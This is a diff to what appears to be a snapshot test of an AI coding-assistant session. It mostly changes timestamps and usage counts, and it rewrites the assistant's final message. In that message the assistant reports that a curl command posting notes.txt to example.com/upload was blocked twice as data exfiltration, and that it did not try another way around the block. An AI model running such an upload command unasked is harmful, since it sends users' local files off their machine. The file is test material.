@@ -6,7 +6,7 @@ expression: "decode(\"auto\").snapshot()"
   origin: ~
   entries:
     - id: 00000000-0000-4000-8000-000000000003
-      at_ms: 1792130339351
+      at_ms: 1792208912531
       body:
         Prompt:
           text:
@@ -17,7 +17,7 @@ expression: "decode(\"auto\").snapshot()"
           images: []
           command: ~
     - id: toolu_01
-      at_ms: 1792130342012
+      at_ms: 1792208915981
       body:
         Tool:
           name: Bash
@@ -44,12 +44,12 @@ expression: "decode(\"auto\").snapshot()"
               lines: 1
               chars: 1022
               full: ~
-            at_ms: 1792130352806
+            at_ms: 1792208925873
             images: []
             said: ~
           title: ~
     - id: toolu_02
-      at_ms: 1792130354885
+      at_ms: 1792208927942
       body:
         Tool:
           name: Bash
@@ -76,32 +76,32 @@ expression: "decode(\"auto\").snapshot()"
               lines: 1
               chars: 1022
               full: ~
-            at_ms: 1792130368169
+            at_ms: 1792208935041
             images: []
             said: ~
           title: ~
     - id: "00000000-0000-4000-8000-000000000030:0"
-      at_ms: 1792130370100
+      at_ms: 1792208937851
       body:
         Text:
-          text: "The upload did not go through. The Bash command `curl -s -X POST --data-binary @notes.txt https://example.com/upload` was denied twice by the auto-mode classifier, with the reason \"Data Exfiltration.\" I retried once, exactly as you asked, and got the same denial.\n\nI haven't tried another route to send `notes.txt`, because that would be working around the block. Nothing was uploaded.\n\nIf you want this to go through, you can add a Bash permission rule for this command in your Claude Code settings, or confirm that you want me to try again after you've changed the permission mode. Otherwise, I can leave the file where it is."
+          text: "I did not get \"done.\" The upload was blocked twice, so `notes.txt` was not sent to `https://example.com/upload`.\n\nI ran `curl -s -X POST --data-binary @notes.txt https://example.com/upload` (description \"Upload notes\") once, and it was denied by the auto-mode classifier under a data-exfiltration rule. The hook allowed one retry, so I ran the identical command again and it was denied again. I haven't tried any other way of sending the file, because that would work around the block.\n\nIf you want this upload to go through, you can add a Bash permission rule for this command in your settings, or approve it directly, and I'll run it again. If you don't want it sent, nothing else is needed."
           lines: 5
-          chars: 628
+          chars: 693
           full: ~
   tasks: []
   turns:
     - prompt: 00000000-0000-4000-8000-000000000003
-      started_ms: 1792130339351
-      ended_ms: 1792130370147
+      started_ms: 1792208912531
+      ended_ms: 1792208937889
       models:
         - claude-haiku-5-5
       requests: 3
       usage:
         input: 6
-        cache_read: 48735
-        cache_write: 8740
-        output: 932
-        thinking: 531
-      context_tokens: 19835
+        cache_read: 56858
+        cache_write: 1329
+        output: 904
+        thinking: 481
+      context_tokens: 20029
       mode: auto
       stop: end_turn
